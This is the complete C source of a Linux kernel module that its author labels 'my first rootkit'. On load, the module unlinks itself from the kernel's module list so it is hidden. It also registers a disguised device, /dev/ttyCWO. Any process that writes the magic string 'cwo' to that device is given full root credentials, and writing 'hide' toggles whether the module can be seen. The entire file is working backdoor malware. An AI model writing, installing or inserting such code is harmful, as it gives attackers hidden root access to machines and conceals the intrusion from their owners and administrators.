#include <linux/init.h>   
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>    
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

#define  DEVICE_NAME "ttyCWO" 
#define  CLASS_NAME  "ttyR"  
#define MODULE_NAME "RangerDanger"

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

static int     __init root_init(void);
static void    __exit root_exit(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);

MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("ranger11danger");
MODULE_DESCRIPTION("my first rootkit"); 
MODULE_VERSION("0.1");


static int            majorNumber; 
static struct class*  RangerDangerClass  = NULL;
static struct device* RangerDangerDevice = NULL;

static struct list_head *module_previous;
static short module_hidden = 0;
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}
static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   magic[] = "cwo";
  char   toggle_hide[] = "hide";
  struct cred *new_cred;
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
  {
      unsigned long ret; // Declare a variable to store the return value

      // Check the return value of copy_from_user
      ret = copy_from_user (data, buf, len);
      if (ret != 0) {
          // Error occurred during copy; clean up and return
          printk(KERN_ERR "root_write: Failed to copy %lu bytes from user\n", ret);
          kfree(data);
          return -EFAULT; // Return appropriate error code to user space
      }
      
      // Data successfully copied, proceed with checks
      if (memcmp(data, magic, 3) == 0)
	  {
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		printk ("Cannot prepare creds\n");
        kfree(data); // Clean up before returning on internal error
		return 0; // Or return an appropriate error code like -ENOMEM
	      }
	    printk ("creating root creds now\n");
	    V(new_cred->uid) = V(new_cred->gid) =  0;
	    V(new_cred->euid) = V(new_cred->egid) = 0;
	    V(new_cred->suid) = V(new_cred->sgid) = 0;
	    V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
	    commit_creds (new_cred);
	  }

    if (memcmp(data, toggle_hide, 4) == 0)
    {
      if (module_hidden) module_show();
			else module_hide();
    }
        kfree(data);
      }

    else
      {
	printk(KERN_ALERT "Unable to allocate memory");
      }
    
    return len;
}


static int __init
root_init(void)
{

   module_hide();

   majorNumber = register_chrdev(0, DEVICE_NAME, &fops);
   RangerDangerClass = class_create(CLASS_NAME);
   RangerDangerDevice = device_create(RangerDangerClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(RangerDangerDevice))
     {
       class_destroy(RangerDangerClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "cannot create device\n");
       return PTR_ERR(RangerDangerDevice);
     }
    printk(KERN_ALERT "successfully installed");
    return 0;
    
}

static void __exit
root_exit(void) 
{
  device_destroy(RangerDangerClass, MKDEV(majorNumber, 0));
  class_unregister(RangerDangerClass);                     
  class_destroy(RangerDangerClass);                        
  unregister_chrdev(majorNumber, DEVICE_NAME);     
}


module_init(root_init);
module_exit(root_exit);
